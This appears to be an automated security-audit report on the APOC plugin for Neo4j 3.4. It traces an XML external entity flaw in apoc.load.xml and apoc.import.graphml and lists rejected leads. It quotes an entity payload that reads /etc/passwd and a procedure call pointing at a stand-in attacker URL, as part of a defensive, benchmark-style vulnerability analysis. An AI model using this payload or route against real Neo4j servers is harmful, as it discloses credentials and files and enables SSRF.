candidates.attacker_control: The Cypher caller supplies the url parameter (and optional headers map) of CALL apoc.load.xml(url, path, config, simple) / apoc.load.xmlSimple(url), and the file argument of CALL apoc.import.graphml(file, config). A remote URL under the attacker's control (http/https, or s3:// / hdfs:// when those jars are installed) is fetched and parsed; for file:// outer URLs FileUtils.checkReadAllowed applies, but remote URLs bypass that gate. The attacker therefore controls the raw XML bytes that reach the parsers, including DOCTYPE/ENTITY declarations.
candidates.counterevidence_checked: Searched main sources for setFeature, XMLConstants, FEATURE_SECURE_PROCESSING, disallow-doctype and similar hardening: none exist, so no counter-mitigation is present in-tree. Verified FileUtils.isFile returns false for strings starting with 'http' (FileUtils.java:114), which is why the remote-URL route bypasses checkReadAllowed, and that ApocConfiguration.isEnabled defaults to false (ApocConfiguration.java:45-47), so file:// outer URLs are blocked by default but entity resolution is not. Confirmed the two XML parser sites are the only DocumentBuilderFactory/XMLInputFactory uses in main code. Considered that the missing apoc.load.XmlTest could be benchmark hygiene rather than evidence; the source-level weakness stands without it. Considered the alternative ExportGraphML write-check issue but did not select it (see rejected leads).
candidates.impact: Disclosure of files readable by the Neo4j JVM (e.g., neo4j.conf/dbms.auth files, keystores, /etc/passwd) to any user who can invoke the procedure, even with file imports disabled; SSRF through http(s) entities against internal services; denial of service via nested entity expansion. Cross-agent side effects are not needed, but file contents leave the server through the result stream.
candidates.prerequisites: An APOC installation on a Neo4j 3.4.x server and the ability to run Cypher calling the APOC procedure (procedures are executable by authenticated users by default; no APOC-specific privilege check is present in this path). No apoc.import.file.enabled or apoc.export.file.enabled setting is required for the remote-URL route. The deployment's JAXP defaults must still resolve external entities (the JDK 8 default behavior that this snapshot assumes, since nothing in the code hardens the factories).
candidates.root_cause: APOC's XML import procedures build JAXP parsers with JDK defaults and never disable DTDs, external general/parameter entities, or enable secure processing. In apoc.load.xml the DocumentBuilderFactory is created with only setNamespaceAware/setIgnoringElementContentWhitespace before parsing the attacker-supplied document (src/main/java/apoc/load/Xml.java:65-68,74), and the shared static XMLInputFactory used by apoc.load.xmlSimple is configured with only IS_COALESCING (Xml.java:39,124). The only restriction, FileUtils.checkReadAllowed(url) (Xml.java:70,122), checks the scheme of the *outer* URL only (FileUtils.java:112-118,137-140): a remote http(s) URL is not a file URL, so the procedure is reachable with apoc.import.file.enabled=false, yet an entity such as <!ENTITY xxe SYSTEM "file:///etc/passwd"> inside that remote document is still resolved locally by the parser. The same pattern exists in apoc.import.graphml (XmlGraphMLReader.parseXML, src/main/java/apoc/export/graphml/XmlGraphMLReader.java:181-183, XMLInputFactory with only isCoalescing).
candidates.title: XXE in apoc.load.xml / apoc.import.graphml XML parsing (unrestricted DTD and external entities)
candidates.trace: 1) CALL apoc.load.xml('http://attacker/x.xml') enters Xml.xml (Xml.java:47-51) and xmlXpathToMapResult (Xml.java:60). 2) DocumentBuilderFactory.newInstance() is used without setFeature("http://apache.org/xml/features/disallow-doctype-decl",true) or external-entity features (Xml.java:65-68). 3) FileUtils.checkReadAllowed(url) passes because 'http...' is not a file URL (FileUtils.java:112-118,137-140). 4) documentBuilder.parse(Util.openInputStream(url,headers,null)) parses the attacker's document and resolves the SYSTEM entity (Xml.java:74); the resolved bytes become a DOM text node. 5) handleNode/handleTextNode normalize that text into the returned map's _text/_children field (Xml.java:189-247,277-301), so the file contents are returned in the procedure result. The StAX variant follows xmlToMapResult -> getXMLStreamReaderFromUrl -> FACTORY.createXMLStreamReader (Xml.java:107-126) with DTD support and external entities left enabled, and apoc.import.graphml reaches XmlGraphMLReader.parseXML through ExportGraphML.file -> FileUtils.readerFor (ExportGraphML.java:38-52, XmlGraphMLReader.java:179-183). The in-tree payload src/test/resources/xml/xxe.xml lines 1-2 exercises exactly this mechanism (.//etc/passwd) but no visible source references it; the class that does (apoc.load.XmlTest) is statically imported by src/test/java/apoc/load/LoadS3Test.java:12 yet absent from the snapshot.
candidates.unverified: Not runtime-confirmed: entity resolution depends on the JAXP implementation/JDK version (JDK 8 defaults shown here resolve external entities) and on the caller's ability to invoke APOC procedures on the target deployment. The exact upstream CVE/fix commit and the reason apoc.load.XmlTest is absent could not be verified from local sources. The graphml path was traced from source only; its URL-based import route (FileUtils.readerFor + Util.openInputStream) was not executed.
candidates.weakness_type: CWE-611 Improper Restriction of XML External Entity Reference (XXE); consequence includes local file disclosure (CWE-200), SSRF (CWE-918) and resource-exhaustion DoS (CWE-776)

coverage_summary: Source scope: 419 root files, 418 model-visible (1 file excluded by the sensitive-name/path filter; no binary/symlink exclusions), per get_source_scope. Relation scope: 418 files, 403 Java files parsed, 196 files omitted/unparsed (resources, docs, XML, HTML), 9400+ syntax edges, 21435 unresolved calls; capabilities explicitly exclude control flow, data flow and semantic resolution, so the index was used only for navigation and every cited edge was verified in source text. I inspected the XML import paths (apoc.load.xml, apoc.load.xmlSimple, apoc.import.graphml), the file-access controls (apoc.util.FileUtils, ApocConfiguration), the export writers (CSV/Cypher/GraphML), JSON parsing (JsonUtil, Convert/Json), URL/stream handling (Util.openInputStream, redirects/gzip/zip), trigger and custom-procedure code, JDBC loading, and the load/export test resources. Not exhaustively read: algo/*, meta, index/fulltext, generate, path, refactor, spatial, text, and most other modules; no scanner or runtime execution was used.
limitations: P1 index is partial: no control-flow, data-flow or semantic resolution; 21435 calls unresolved, and 196 files omitted from parsing. Index presence/absence does not prove reachability.

One model-visible file is excluded by the safety filter (identity unknown); apoc.load.XmlTest is absent from the snapshot even though LoadS3Test statically imports it, which may be benchmark hygiene rather than vulnerability evidence.
No code was executed and no tests/scanners were run; exploitability statements are source-level inferences about JAXP defaults.
The exact CVE/fix commit and upstream diff could not be consulted; the case-to-issue mapping (VUL4J-61) was not externally verified.
Coverage was targeted rather than exhaustive over all 418 files; modules such as algo, meta, index, generate, path and spatial were not deeply audited.

rejected_leads.lead: ExportGraphML.exportGraphML (src/main/java/apoc/export/graphml/ExportGraphML.java:92-95) checks FileUtils.checkReadAllowed(fileName) instead of checkWriteAllowed() before opening the output file, so apoc.export.graphml.* can write/overwrite arbitrary paths when apoc.import.file.enabled=true while apoc.export.file.enabled=false; every other writer (ExportCSV.java:92, ExportCypher.java:95) calls checkWriteAllowed().
rejected_leads.reason: Plausible arbitrary-file-write lead, but not selected as the single candidate: it may be the long-standing upstream code at this commit rather than the benchmark's injected defect, it needs the unusual import-enabled/export-disabled configuration, and unlike the XXE path there is no PoC resource or missing-test residue pointing at it in the snapshot.

rejected_leads.lead: apoc.load.jdbc / apoc.load.driver accept an arbitrary JDBC URL or driver class name and call DriverManager.getConnection / Class.forName on it (src/main/java/apoc/load/Jdbc.java:45-68,84-113).
rejected_leads.reason: Rejected as weaker: driver availability is deployment-dependent (URL must match an installed driver) and the procedure is documented to accept URLs; no source-level restriction is expected here.

rejected_leads.lead: apoc.custom.registerProcedure/registerFunction can register arbitrary Cypher as procedures/functions (boolean admin = false; // TODO at src/main/java/apoc/custom/CypherProcedures.java:113).
rejected_leads.reason: Rejected: it is the intended feature and the privilege semantics depend on Neo4j's procedure registration mechanism; no concrete missing check was identified in source within review time.

summary: Reviewed the APOC (neo4j-apoc-procedures 3.4.0.3 / Neo4j 3.4.9) snapshot for attacker-controlled input reaching dangerous sinks across the procedure surface. One distinct candidate selected: the XML import paths (apoc.load.xml / apoc.load.xmlSimple, and the same root cause in apoc.import.graphml) parse attacker-supplied XML with default JAXP settings and no DTD/external-entity restrictions, while the only file-access guard (FileUtils.checkReadAllowed) validates the outer URL string rather than resolved entities. Supporting (non-conclusive) artifact: src/test/resources/xml/xxe.xml, an entity payload for file:///etc/passwd, is present but unreferenced because the test class it evidently belonged to (apoc.load.XmlTest, statically imported by LoadS3Test) is absent from the snapshot. An alternative lead (ExportGraphML using checkReadAllowed instead of checkWriteAllowed) is recorded but not selected.
